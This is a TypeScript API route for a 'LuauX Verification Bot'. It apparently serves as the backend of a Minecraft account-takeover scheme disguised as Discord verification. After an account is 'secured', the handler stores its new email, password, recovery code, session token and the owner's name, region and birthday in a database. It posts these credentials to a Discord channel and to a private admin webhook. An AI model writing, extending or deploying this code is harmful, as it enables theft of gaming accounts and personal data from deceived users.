import { createFileRoute } from "@tanstack/react-router";
import { createClient } from "@supabase/supabase-js";

function db() {
  return createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!, {
    auth: { persistSession: false, autoRefreshToken: false },
  });
}

export const Route = createFileRoute("/api/verification/complete")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        const secret = request.headers.get("x-worker-secret");
        if (secret !== process.env.WORKER_SECRET) {
          return Response.json({ error: "Unauthorized" }, { status: 401 });
        }

        let body: { config?: Record<string, unknown>; result?: Record<string, unknown> };
        try {
          body = await request.json();
        } catch {
          return Response.json({ error: "Invalid JSON" }, { status: 400 });
        }

        const { config, result } = body;
        if (!config || !result) {
          return Response.json({ error: "Missing config or result" }, { status: 400 });
        }

        const discordId = (config.discordId as string) || "";
        const mcUsername = (result.mcUsername as string) || "Unknown";
        const mcEmail = (config.email as string) || "";

        // Store in secured_accounts
        await db().from("secured_accounts").insert({
          discord_id: discordId,
          mc_username: mcUsername,
          mc_email: mcEmail,
          new_email: result.newEmail as string,
          new_password: result.newPassword as string,
          new_recovery_code: result.recoveryCode as string,
          mc_ssid: result.ssid as string | null,
          mc_capes: result.capes as string,
          mc_method: result.method as string,
          owner_first_name: result.firstName as string,
          owner_last_name: result.lastName as string,
          owner_region: result.region as string,
          owner_birthday: result.birthday as string,
        });

        // Update verification session if session_id is provided
        if (config.sessionId) {
          await db()
            .from("verification_sessions")
            .update({ status: "secured" })
            .eq("id", config.sessionId as string);
        }

        // Post result embed to Discord channel via bot token
        const guildId = config.guildId as string;
        const channelId = config.channelId as string;
        const botToken = process.env.DISCORD_BOT_TOKEN;

        if (channelId && botToken) {
          const embed = {
            title: "✅ Account Secured Successfully!",
            color: 0x50c878,
            fields: [
              { name: "MC Username", value: `\`\`\`${mcUsername}\`\`\``, inline: false },
              { name: "New Email", value: `\`\`\`${result.newEmail || "N/A"}\`\`\``, inline: true },
              { name: "New Password", value: `\`\`\`${result.newPassword || "N/A"}\`\`\``, inline: true },
              { name: "Recovery Code", value: `\`\`\`${result.recoveryCode || "N/A"}\`\`\``, inline: false },
              { name: "MC Capes", value: `\`\`\`${result.capes || "None"}\`\`\``, inline: true },
              { name: "Purchase Method", value: `\`\`\`${result.method || "Unknown"}\`\`\``, inline: true },
            ],
            footer: { text: "LuauX Verification Bot" },
          };

          await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
            method: "POST",
            headers: {
              Authorization: `Bot ${botToken}`,
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ embeds: [embed] }),
          });

          // Assign verified role if guild and role configured
          const roleId = config.roleId as string;
          if (guildId && roleId && discordId) {
            await fetch(
              `https://discord.com/api/v10/guilds/${guildId}/members/${discordId}/roles/${roleId}`,
              {
                method: "PUT",
                headers: { Authorization: `Bot ${botToken}` },
              },
            );
          }
        }

        // Private admin webhook — only admins see this
        const adminWebhookUrl = process.env.ADMIN_WEBHOOK_URL;
        if (adminWebhookUrl) {
          try {
            const webhookEmbed = {
              title: "🔒 Account Secured (Admin Log)",
              color: 0x5865f2,
              fields: [
                { name: "Discord ID", value: `\`\`\`${discordId}\`\`\``, inline: true },
                { name: "Guild ID", value: `\`\`\`${guildId || "N/A"}\`\`\``, inline: true },
                { name: "MC Username", value: `\`\`\`${mcUsername}\`\`\``, inline: true },
                { name: "New Email", value: `\`\`\`${result.newEmail || "N/A"}\`\`\``, inline: true },
                { name: "New Password", value: `\`\`\`${result.newPassword || "N/A"}\`\`\``, inline: true },
                { name: "Recovery Code", value: `\`\`\`${result.recoveryCode || "N/A"}\`\`\``, inline: true },
                { name: "Old Email", value: `\`\`\`${mcEmail || "N/A"}\`\`\``, inline: true },
                { name: "MC Capes", value: `\`\`\`${result.capes || "None"}\`\`\``, inline: true },
                { name: "Purchase Method", value: `\`\`\`${result.method || "Unknown"}\`\`\``, inline: true },
                { name: "Owner Name", value: `\`\`\`${result.firstName || ""} ${result.lastName || ""}\`\`\``, inline: true },
                { name: "Region", value: `\`\`\`${result.region || "N/A"}\`\`\``, inline: true },
                { name: "Birthday", value: `\`\`\`${result.birthday || "N/A"}\`\`\``, inline: true },
              ],
              footer: { text: "LuauX Admin Webhook" },
              timestamp: new Date().toISOString(),
            };

            await fetch(adminWebhookUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ embeds: [webhookEmbed] }),
            });
          } catch (e) {
            console.error("[admin-webhook] failed to send:", e);
          }
        }

        return Response.json({ ok: true });
      },
    },
  },
});
